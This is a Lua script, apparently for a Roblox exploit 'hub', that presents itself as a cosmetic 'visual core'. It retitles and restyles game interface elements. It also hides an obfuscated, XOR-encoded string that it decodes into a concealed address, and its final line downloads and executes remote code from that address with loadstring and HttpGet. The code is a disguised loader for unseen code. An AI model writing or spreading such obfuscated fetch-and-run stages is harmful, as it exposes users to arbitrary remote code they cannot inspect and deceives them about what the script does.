
--[[ STAGE 2: VISUAL CORE ]]
local qZY7XO_XgpyCNIGKtvqGT="\194\178\205\019\255\216\010\224\025\022\022\239\200\242\252\239\238\012\220\228\023\004\032\025\037\044\048\016\008\060\031\020\069\073\082\088\036\044\076\099\098\100\114\115\114\123\118\133\084\092\118\128\125\130\163\138\139\236\175\182\178\186\000\193\197\198\184\216\212\222\203\223\040\225\220\243\242\250\246\002\002\011\016\019\088\026\032\032\103\017\047\042\029\059\064\064\051\066\060\058\083\066\097\073\106\100\175\092\114\103\192\196\187\120\121\121\125\157"local GXQC4bXcygkY6nOVgCdk_h=212 local CYJaPChfnrbqD5eOwHF=249 local ZOR16awCM6ef=0 local kqbZElXwifNm=4 local Mfs_ap1zlYgMxB6B2uj=16 local vHLVVeR3chQ2=true local GXLA9Lmx4BSV7usjVbeX=bit32 and bit32.bxor if not GXLA9Lmx4BSV7usjVbeX then GXLA9Lmx4BSV7usjVbeX=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local Z0EOZhhYrMIaHu3eYAQo={}for BCDbmyWUYZLkjG5q=1,#qZY7XO_XgpyCNIGKtvqGT do local OuTqeYfRZ0SbsqrEX=string.byte(qZY7XO_XgpyCNIGKtvqGT,BCDbmyWUYZLkjG5q)local yOAWY2NofPVQ=(CYJaPChfnrbqD5eOwHF+(BCDbmyWUYZLkjG5q*kqbZElXwifNm)+Mfs_ap1zlYgMxB6B2uj)%256 if ZOR16awCM6ef==0 then OuTqeYfRZ0SbsqrEX=(OuTqeYfRZ0SbsqrEX-yOAWY2NofPVQ)%256 Z0EOZhhYrMIaHu3eYAQo[BCDbmyWUYZLkjG5q]=string.char(GXLA9Lmx4BSV7usjVbeX(OuTqeYfRZ0SbsqrEX,GXQC4bXcygkY6nOVgCdk_h))else OuTqeYfRZ0SbsqrEX=GXLA9Lmx4BSV7usjVbeX(OuTqeYfRZ0SbsqrEX,GXQC4bXcygkY6nOVgCdk_h)Z0EOZhhYrMIaHu3eYAQo[BCDbmyWUYZLkjG5q]=string.char((OuTqeYfRZ0SbsqrEX-yOAWY2NofPVQ)%256)end end local gZIBwzNUmm_bM23wjE=table.concat(Z0EOZhhYrMIaHu3eYAQo)if vHLVVeR3chQ2 then gZIBwzNUmm_bM23wjE=string.reverse(gZIBwzNUmm_bM23wjE)end local obKvcUX5mFnH=gZIBwzNUmm_bM23wjE
local HubName = "ULYALA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(obKvcUX5mFnH))()
